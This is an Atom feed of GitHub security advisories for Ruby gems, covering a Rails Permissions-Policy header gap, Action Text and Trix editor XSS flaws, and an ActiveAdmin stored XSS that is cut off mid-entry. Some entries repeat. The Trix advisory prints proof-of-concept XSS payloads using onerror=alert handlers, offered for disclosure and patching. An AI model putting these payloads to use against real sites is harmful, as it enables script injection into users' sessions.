<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2024-06-19T02:14:18.269Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[actionpack] Missing security headers in Action Pack on non-HTML responses]]></title>
        <id>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</id>
        <link href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7"/>
        <updated>2024-06-05T21:54:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="permissions-policy-is-only-served-on-html-content-type">Permissions-Policy is Only Served on HTML Content-Type</h1>
<p>The application configurable Permissions-Policy is only served on responses
with an HTML related Content-Type.</p>
<p>This has been assigned the CVE identifier CVE-2024-28103.</p>
<p>Versions Affected:  &gt;= 6.1.0
Not affected:       &lt; 6.1.0
Fixed Versions:     6.1.7.8, 7.0.8.4, and 7.1.3.4</p>
<h2 id="impact">Impact</h2>
<p>Responses with a non-HTML Content-Type are not serving the configured Permissions-Policy. There are certain non-HTML Content-Types that would benefit from having the Permissions-Policy enforced.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for
the supported release series in accordance with our 
<a href="https://guides.rubyonrails.org/maintenance_policy.html#security-issues">maintenance policy</a>
regarding security issues. They are in git-am format and consist of a
single changeset.</p>
<ul>
<li>6-1-include-permissions-policy-header-on-non-html.patch - Patch for 6.1 series</li>
<li>7-0-include-permissions-policy-header-on-non-html.patch - Patch for 7.0 series</li>
<li>7-1-include-permissions-policy-header-on-non-html.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thank you <a href="https://hackerone.com/shinkbr">shinkbr</a> for reporting this!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28103">https://nvd.nist.gov/vuln/detail/CVE-2024-28103</a></li>
<li><a href="https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523">https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/advisories/GHSA-fwhr-88qx-h9g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-04T22:26:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] Missing security headers in Action Pack on non-HTML responses]]></title>
        <id>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</id>
        <link href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7"/>
        <updated>2024-06-05T21:54:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="permissions-policy-is-only-served-on-html-content-type">Permissions-Policy is Only Served on HTML Content-Type</h1>
<p>The application configurable Permissions-Policy is only served on responses
with an HTML related Content-Type.</p>
<p>This has been assigned the CVE identifier CVE-2024-28103.</p>
<p>Versions Affected:  &gt;= 6.1.0
Not affected:       &lt; 6.1.0
Fixed Versions:     6.1.7.8, 7.0.8.4, and 7.1.3.4</p>
<h2 id="impact">Impact</h2>
<p>Responses with a non-HTML Content-Type are not serving the configured Permissions-Policy. There are certain non-HTML Content-Types that would benefit from having the Permissions-Policy enforced.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for
the supported release series in accordance with our 
<a href="https://guides.rubyonrails.org/maintenance_policy.html#security-issues">maintenance policy</a>
regarding security issues. They are in git-am format and consist of a
single changeset.</p>
<ul>
<li>6-1-include-permissions-policy-header-on-non-html.patch - Patch for 6.1 series</li>
<li>7-0-include-permissions-policy-header-on-non-html.patch - Patch for 7.0 series</li>
<li>7-1-include-permissions-policy-header-on-non-html.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thank you <a href="https://hackerone.com/shinkbr">shinkbr</a> for reporting this!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28103">https://nvd.nist.gov/vuln/detail/CVE-2024-28103</a></li>
<li><a href="https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523">https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/advisories/GHSA-fwhr-88qx-h9g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-04T22:26:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] Missing security headers in Action Pack on non-HTML responses]]></title>
        <id>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</id>
        <link href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7"/>
        <updated>2024-06-05T21:54:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="permissions-policy-is-only-served-on-html-content-type">Permissions-Policy is Only Served on HTML Content-Type</h1>
<p>The application configurable Permissions-Policy is only served on responses
with an HTML related Content-Type.</p>
<p>This has been assigned the CVE identifier CVE-2024-28103.</p>
<p>Versions Affected:  &gt;= 6.1.0
Not affected:       &lt; 6.1.0
Fixed Versions:     6.1.7.8, 7.0.8.4, and 7.1.3.4</p>
<h2 id="impact">Impact</h2>
<p>Responses with a non-HTML Content-Type are not serving the configured Permissions-Policy. There are certain non-HTML Content-Types that would benefit from having the Permissions-Policy enforced.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for
the supported release series in accordance with our 
<a href="https://guides.rubyonrails.org/maintenance_policy.html#security-issues">maintenance policy</a>
regarding security issues. They are in git-am format and consist of a
single changeset.</p>
<ul>
<li>6-1-include-permissions-policy-header-on-non-html.patch - Patch for 6.1 series</li>
<li>7-0-include-permissions-policy-header-on-non-html.patch - Patch for 7.0 series</li>
<li>7-1-include-permissions-policy-header-on-non-html.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thank you <a href="https://hackerone.com/shinkbr">shinkbr</a> for reporting this!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28103">https://nvd.nist.gov/vuln/detail/CVE-2024-28103</a></li>
<li><a href="https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523">https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/advisories/GHSA-fwhr-88qx-h9g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-04T22:26:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actionpack] Missing security headers in Action Pack on non-HTML responses]]></title>
        <id>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</id>
        <link href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7"/>
        <updated>2024-06-05T21:54:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="permissions-policy-is-only-served-on-html-content-type">Permissions-Policy is Only Served on HTML Content-Type</h1>
<p>The application configurable Permissions-Policy is only served on responses
with an HTML related Content-Type.</p>
<p>This has been assigned the CVE identifier CVE-2024-28103.</p>
<p>Versions Affected:  &gt;= 6.1.0
Not affected:       &lt; 6.1.0
Fixed Versions:     6.1.7.8, 7.0.8.4, and 7.1.3.4</p>
<h2 id="impact">Impact</h2>
<p>Responses with a non-HTML Content-Type are not serving the configured Permissions-Policy. There are certain non-HTML Content-Types that would benefit from having the Permissions-Policy enforced.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for
the supported release series in accordance with our 
<a href="https://guides.rubyonrails.org/maintenance_policy.html#security-issues">maintenance policy</a>
regarding security issues. They are in git-am format and consist of a
single changeset.</p>
<ul>
<li>6-1-include-permissions-policy-header-on-non-html.patch - Patch for 6.1 series</li>
<li>7-0-include-permissions-policy-header-on-non-html.patch - Patch for 7.0 series</li>
<li>7-1-include-permissions-policy-header-on-non-html.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thank you <a href="https://hackerone.com/shinkbr">shinkbr</a> for reporting this!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/rails/rails/security/advisories/GHSA-fwhr-88qx-h9g7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28103">https://nvd.nist.gov/vuln/detail/CVE-2024-28103</a></li>
<li><a href="https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523">https://github.com/rails/rails/commit/35858f1d9d57f6c4050a8d9ab754bd5d088b4523</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-28103.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-fwhr-88qx-h9g7">https://github.com/advisories/GHSA-fwhr-88qx-h9g7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fwhr-88qx-h9g7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-04T22:26:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actiontext] ActionText ContentAttachment can Contain Unsanitized HTML]]></title>
        <id>https://github.com/advisories/GHSA-prjp-h48f-jgf6</id>
        <link href="https://github.com/advisories/GHSA-prjp-h48f-jgf6"/>
        <updated>2024-06-05T21:54:43.000Z</updated>
        <content type="html"><![CDATA[<p>Instances of ActionText::Attachable::ContentAttachment included within a rich_text_area tag could potentially contain unsanitized HTML.</p>
<p>This has been assigned the CVE identifier CVE-2024-32464.</p>
<p>Versions Affected:  &gt;= 7.1.0
Not affected:       &lt; 7.1.0
Fixed Versions:     7.1.3.4</p>
<h2 id="impact">Impact</h2>
<p>This could lead to a potential cross site scripting issue within the Trix editor.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for the supported release series in accordance with our <a href="https://guides.rubyonrails.org/maintenance_policy.html#security-issues">maintenance policy</a> regarding security issues. They are in git-am format and consist of a single changeset.</p>
<ul>
<li>action_text_content_attachment_xss_7_1_stable.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thank you <a href="https://hackerone.com/ooooooo_q">ooooooo_q</a> for reporting this!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-prjp-h48f-jgf6">https://github.com/rails/rails/security/advisories/GHSA-prjp-h48f-jgf6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32464">https://nvd.nist.gov/vuln/detail/CVE-2024-32464</a></li>
<li><a href="https://github.com/rails/rails/commit/e215bf3360e6dfe1497c1503a495e384ed6b0995">https://github.com/rails/rails/commit/e215bf3360e6dfe1497c1503a495e384ed6b0995</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-32464.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-32464.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-prjp-h48f-jgf6">https://github.com/advisories/GHSA-prjp-h48f-jgf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-prjp-h48f-jgf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-04T22:26:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actiontext] ActionText ContentAttachment can Contain Unsanitized HTML]]></title>
        <id>https://github.com/advisories/GHSA-prjp-h48f-jgf6</id>
        <link href="https://github.com/advisories/GHSA-prjp-h48f-jgf6"/>
        <updated>2024-06-05T21:54:43.000Z</updated>
        <content type="html"><![CDATA[<p>Instances of ActionText::Attachable::ContentAttachment included within a rich_text_area tag could potentially contain unsanitized HTML.</p>
<p>This has been assigned the CVE identifier CVE-2024-32464.</p>
<p>Versions Affected:  &gt;= 7.1.0
Not affected:       &lt; 7.1.0
Fixed Versions:     7.1.3.4</p>
<h2 id="impact">Impact</h2>
<p>This could lead to a potential cross site scripting issue within the Trix editor.</p>
<h2 id="releases">Releases</h2>
<p>The fixed releases are available at the normal locations.</p>
<h2 id="workarounds">Workarounds</h2>
<p>N/A</p>
<h2 id="patches">Patches</h2>
<p>To aid users who aren't able to upgrade immediately we have provided patches for the supported release series in accordance with our <a href="https://guides.rubyonrails.org/maintenance_policy.html#security-issues">maintenance policy</a> regarding security issues. They are in git-am format and consist of a single changeset.</p>
<ul>
<li>action_text_content_attachment_xss_7_1_stable.patch - Patch for 7.1 series</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Thank you <a href="https://hackerone.com/ooooooo_q">ooooooo_q</a> for reporting this!</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rails/rails/security/advisories/GHSA-prjp-h48f-jgf6">https://github.com/rails/rails/security/advisories/GHSA-prjp-h48f-jgf6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32464">https://nvd.nist.gov/vuln/detail/CVE-2024-32464</a></li>
<li><a href="https://github.com/rails/rails/commit/e215bf3360e6dfe1497c1503a495e384ed6b0995">https://github.com/rails/rails/commit/e215bf3360e6dfe1497c1503a495e384ed6b0995</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-32464.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-32464.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-prjp-h48f-jgf6">https://github.com/advisories/GHSA-prjp-h48f-jgf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-prjp-h48f-jgf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-04T22:26:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actiontext] Trix Editor Arbitrary Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qjqp-xr96-cj99</id>
        <link href="https://github.com/advisories/GHSA-qjqp-xr96-cj99"/>
        <updated>2024-06-03T17:24:57.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>
<p><strong>Vulnerable Versions</strong>: </p>
<ul>
<li>1.x series up to and including 1.3.1</li>
<li>2.x series up to and including 2.1.0</li>
</ul>
<p><strong>Fixed Versions</strong>: </p>
<ul>
<li>v1.3.2</li>
<li>v2.1.1</li>
</ul>
<p><strong>Vector</strong>:</p>
<ul>
<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>
</ul>
<pre><code class="language-js">document.addEventListener('copy', function(e){
  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class="123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');
  e.preventDefault();
});
</code></pre>
<p>and pasting into the Trix editor, the script within the content is executed.</p>
<ul>
<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>
</ul>
<pre><code class="language-js">document.write(`copy&lt;div data-trix-attachment="{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}"&gt;&lt;/div&gt;me`);
</code></pre>
<h3 id="impact">Impact:</h3>
<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="remediation">Remediation:</h3>
<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>
<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1153">https://github.com/basecamp/trix/pull/1153</a></li>
</ul>
<p><strong>Credit</strong>: These issues were reported by security researchers <a href="https://hackerone.com/loknop">loknop</a> and <a href="https://hackerone.com/pinpie">pinpie</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>
<li><a href="https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34341">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>
<li><a href="https://github.com/rails/rails/commit/07e6c88cc4defe6f6b8d28e79eb13a518e15b14c">https://github.com/rails/rails/commit/07e6c88cc4defe6f6b8d28e79eb13a518e15b14c</a></li>
<li><a href="https://github.com/rails/rails/commit/260cb392fc1ee91d0b749cff08d1c8d54b230bd3">https://github.com/rails/rails/commit/260cb392fc1ee91d0b749cff08d1c8d54b230bd3</a></li>
<li><a href="https://github.com/rails/rails/commit/73fac32511eefdd45d8f00fecc2b8cc5408ea6d5">https://github.com/rails/rails/commit/73fac32511eefdd45d8f00fecc2b8cc5408ea6d5</a></li>
<li><a href="https://discuss.rubyonrails.org/t/xss-vulnerabilities-in-trix-editor/85803">https://discuss.rubyonrails.org/t/xss-vulnerabilities-in-trix-editor/85803</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-34341.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-34341.yml</a></li>
<li><a href="https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-2-and-7-1-3-3-have-been-released">https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-2-and-7-1-3-3-have-been-released</a></li>
<li><a href="https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-3-has-been-released">https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-3-has-been-released</a></li>
<li><a href="https://github.com/advisories/GHSA-qjqp-xr96-cj99">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjqp-xr96-cj99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T16:49:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[actiontext] Trix Editor Arbitrary Code Execution Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-qjqp-xr96-cj99</id>
        <link href="https://github.com/advisories/GHSA-qjqp-xr96-cj99"/>
        <updated>2024-06-03T17:24:57.000Z</updated>
        <content type="html"><![CDATA[<p>The Trix editor, versions prior to 2.1.1, is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.</p>
<p><strong>Vulnerable Versions</strong>: </p>
<ul>
<li>1.x series up to and including 1.3.1</li>
<li>2.x series up to and including 2.1.0</li>
</ul>
<p><strong>Fixed Versions</strong>: </p>
<ul>
<li>v1.3.2</li>
<li>v2.1.1</li>
</ul>
<p><strong>Vector</strong>:</p>
<ul>
<li><strong>Bug 1</strong>: When copying content manipulated by a script, such as:</li>
</ul>
<pre><code class="language-js">document.addEventListener('copy', function(e){
  e.clipboardData.setData('text/html', '&lt;div&gt;&lt;noscript&gt;&lt;div class="123&lt;/noscript&gt;456&lt;img src=1 onerror=alert(1)//"&gt;&lt;/div&gt;&lt;/noscript&gt;&lt;/div&gt;');
  e.preventDefault();
});
</code></pre>
<p>and pasting into the Trix editor, the script within the content is executed.</p>
<ul>
<li><strong>Bug 2</strong>: Similar execution occurs with content structured as:</li>
</ul>
<pre><code class="language-js">document.write(`copy&lt;div data-trix-attachment="{&amp;quot;contentType&amp;quot;:&amp;quot;text/html&amp;quot;,&amp;quot;content&amp;quot;:&amp;quot;&amp;lt;img src=1 onerror=alert(101)&amp;gt;HELLO123&amp;quot;}"&gt;&lt;/div&gt;me`);
</code></pre>
<h3 id="impact">Impact:</h3>
<p>An attacker could exploit these vulnerabilities to execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
<h3 id="remediation">Remediation:</h3>
<p><strong>Update Recommendation</strong>: Users should upgrade to Trix editor version 2.1.1 or later, which incorporates proper sanitization of input from copied content.</p>
<p><strong>CSP Enhancement</strong>: Additionally, enhancing the Content Security Policy (CSP) to disallow inline scripts can significantly mitigate the risk of such vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1153">https://github.com/basecamp/trix/pull/1153</a></li>
</ul>
<p><strong>Credit</strong>: These issues were reported by security researchers <a href="https://hackerone.com/loknop">loknop</a> and <a href="https://hackerone.com/pinpie">pinpie</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99">https://github.com/basecamp/trix/security/advisories/GHSA-qjqp-xr96-cj99</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1147">https://github.com/basecamp/trix/pull/1147</a></li>
<li><a href="https://github.com/basecamp/trix/pull/1149">https://github.com/basecamp/trix/pull/1149</a></li>
<li><a href="https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad">https://github.com/basecamp/trix/commit/1a5c68a14d48421fc368e30026f4a7918028b7ad</a></li>
<li><a href="https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554">https://github.com/basecamp/trix/commit/841ff19b53f349915100bca8fcb488214ff93554</a></li>
<li><a href="https://github.com/basecamp/trix/releases/tag/v2.1.1">https://github.com/basecamp/trix/releases/tag/v2.1.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34341">https://nvd.nist.gov/vuln/detail/CVE-2024-34341</a></li>
<li><a href="https://github.com/rails/rails/commit/07e6c88cc4defe6f6b8d28e79eb13a518e15b14c">https://github.com/rails/rails/commit/07e6c88cc4defe6f6b8d28e79eb13a518e15b14c</a></li>
<li><a href="https://github.com/rails/rails/commit/260cb392fc1ee91d0b749cff08d1c8d54b230bd3">https://github.com/rails/rails/commit/260cb392fc1ee91d0b749cff08d1c8d54b230bd3</a></li>
<li><a href="https://github.com/rails/rails/commit/73fac32511eefdd45d8f00fecc2b8cc5408ea6d5">https://github.com/rails/rails/commit/73fac32511eefdd45d8f00fecc2b8cc5408ea6d5</a></li>
<li><a href="https://discuss.rubyonrails.org/t/xss-vulnerabilities-in-trix-editor/85803">https://discuss.rubyonrails.org/t/xss-vulnerabilities-in-trix-editor/85803</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-34341.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actiontext/CVE-2024-34341.yml</a></li>
<li><a href="https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-2-and-7-1-3-3-have-been-released">https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-2-and-7-1-3-3-have-been-released</a></li>
<li><a href="https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-3-has-been-released">https://rubyonrails.org/2024/5/17/Rails-Versions-7-0-8-3-has-been-released</a></li>
<li><a href="https://github.com/advisories/GHSA-qjqp-xr96-cj99">https://github.com/advisories/GHSA-qjqp-xr96-cj99</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qjqp-xr96-cj99</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-07T16:49:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[activeadmin] activeadmin vulnerable to stored persistent cross-site scripting (XSS) in dynamic form legends]]></title>
        <id>https://github.com/advisories/GHSA-9mg6-x45v-hcfm</id>
        <link href="https://github.com/advisories/GHSA-9mg6-x45v-hcfm"/>
        <updated>2024-06-04T02:44:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users settings their active admin form legends dynamically may be vulnerable to stored XSS, as long as its value can be injected directly by a malicious user.</p>
<p>For example:</p>
<ul>
<li>A public web application allows users to create entities with arbitrary names.</li>
<li>Active Admin is used to administrate these entities through a private backend.</li>
<li>The form to edit these entities in the private backend has the following shape (note the dynamic <code>name</code> value dependent on an attribute of the <code>resource</code>):</li>
</ul>
<pre><code class="language-ruby">  form do |f|
    f.inputs name: resource.name do
      f.input :name
      f.input :description
    end

    f.actions
  end
</code></pre>
<p>Then a malicious user could create an entity with a payload that would get executed in the active admin administrator's browser.</p>
